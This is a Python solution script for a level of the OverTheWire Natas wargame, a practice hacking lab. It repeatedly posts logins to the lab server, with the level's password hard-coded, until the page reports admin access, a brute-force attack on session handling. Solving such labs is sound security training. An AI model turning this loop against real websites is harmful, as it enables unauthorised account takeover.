import requests
import sys

url = "http://natas18.natas.labs.overthewire.org"
user = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
magic_content = "You are an admin"
wrong_conent = "You are logged in as a regular user"
counter = 0

while True:
    resp = requests.post(url, data={"username": "natas19", "password": "pass"}, auth=(user, password))
    #print('cookie: ' + resp.cookies['PHPSESSID'])
    if magic_content in resp.content:
        print("Solved: " + resp.content)
        sys.exit()
    elif wrong_conent in resp.content:
        counter += 1
        if counter % 20 == 0:
            print("Trying for the " + str(counter) + ". times")
    else:
        print("Failed to solved: " + resp.content)
        sys.exit()
